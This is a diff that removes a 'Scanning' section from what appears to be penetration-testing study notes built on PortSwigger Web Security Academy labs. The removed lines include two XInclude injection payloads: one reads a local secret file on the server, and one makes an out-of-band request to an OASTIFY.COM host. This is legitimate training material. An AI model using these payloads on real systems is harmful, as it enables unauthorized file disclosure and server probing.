@@ -1,26 +1,4 @@
-# Scanning  
 
->Enumeration of the Web Applications start with initial and directed scanning in time limited engagement.   
-
-## Focus Scanning  
-
->Due to the tight time limit during engagements or exam, [scan defined insertion points](https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing) for specific requests.  
-
-![scan-defined-insertion-points](images/scan-defined-insertion-points.png)  
-
->Scanner detected **XML injection** vulnerability on storeId parameter and this lead to reading the secret Carlos file.  
-
-```xml
-<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///home/carlos/secret"/></foo>
-```  
-
->Out of band XInclude request, need hosted DTD to read local file.  
-
-```xml
-<hqt xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://OASTIFY.COM/foo"/></hqt>
-```  
-
-[PortSwigger Lab: Discovering vulnerabilities quickly with targeted scanning](https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-discovering-vulnerabilities-quickly-with-targeted-scanning)  
 
 ## Scanning non-standard data structures  
 
